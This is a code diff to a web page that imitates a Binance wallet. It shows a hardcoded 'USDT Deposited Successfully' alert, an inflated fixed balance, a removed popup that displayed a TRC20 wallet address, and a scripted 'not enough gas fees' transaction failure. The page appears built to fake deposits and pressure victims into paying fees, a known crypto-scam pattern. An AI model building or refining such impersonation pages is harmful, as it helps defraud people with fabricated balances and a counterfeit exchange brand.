@@ -136,20 +136,42 @@
     font-weight: 600;
   }
 
-  /* Notification Popup */
-  .notification {
+  /* Binance-Style Deposit Notification */
+  .deposit-notif {
     position: fixed;
-    top: 20px;
+    top: -100px;
     left: 50%;
     transform: translateX(-50%);
-    background: #1ecb6c;
-    color: black;
-    padding: 15px 20px;
-    border-radius: 12px;
+    background: rgba(10,10,10,0.9);
+    border: 1px solid #f5c32c;
+    padding: 14px 22px;
+    border-radius: 14px;
     font-weight: 700;
-    display: none;
-    z-index: 9999;
-    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    color: #f5c32c;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    box-shadow: 0 0 12px rgba(245,195,44,0.5);
+    opacity: 0;
+    transition: all 0.45s ease;
+    z-index: 99999;
+  }
+
+  .deposit-notif.show {
+    top: 20px;
+    opacity: 1;
+  }
+
+  .notif-icon {
+    width: 26px;
+    height: 26px;
+    background: #f5c32c;
+    color: black;
+    font-weight: 900;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 50%;
   }
 
 </style>
@@ -157,13 +179,19 @@
 
 <body>
 
+<!-- Notification -->
+<div class="deposit-notif" id="depositNotif">
+  <div class="notif-icon">₮</div>
+  122 USDT Deposited Successfully
+</div>
+
 <div class="container">
 
   <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" width="48">
 
   <div class="value-section">
     <div style="opacity:0.7; margin-top:10px;">Est. Total Value 👁</div>
-    <h1>$16,230.90</h1>
+    <h1>$16,352.90</h1>
   </div>
 
   <!-- Add Funds Button -->
@@ -172,7 +200,8 @@
 
   <div class="watchlist-title">Watchlist • Coin</div>
 
-  <!-- Coin list -->
+  <!-- WATCHLIST FIXED & FULLY RESTORED -->
+  
   <div class="coin-row">
     <div class="coin-info">
       <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png">
@@ -318,11 +347,6 @@
   </div>
 </div>
 
-<!-- Notification Popup -->
-<div class="notification" id="walletNotification">
-  USDT TRC20: TUSAnuXF41utuBuX3fKPPAwA74a1E4stWD
-</div>
-
 <script>
 function openWalletModal() {
   document.getElementById("walletModal").style.display = "flex";
@@ -341,15 +365,14 @@ function failTransaction() {
     "Transaction failed: Not enough gas fees for TRC20 transfer.";
 }
 
-// Show wallet address notification
+// WORKING BINANCE STYLE DEPOSIT DROPDOWN
 function showNotification() {
-  const notif = document.getElementById("walletNotification");
-  notif.style.display = "block";
+  const notif = document.getElementById("depositNotif");
+  notif.classList.add("show");
 
-  // Hide after 5 seconds
   setTimeout(() => {
-    notif.style.display = "none";
-  }, 5000);
+    notif.classList.remove("show");
+  }, 4000);
 }
 </script>
 
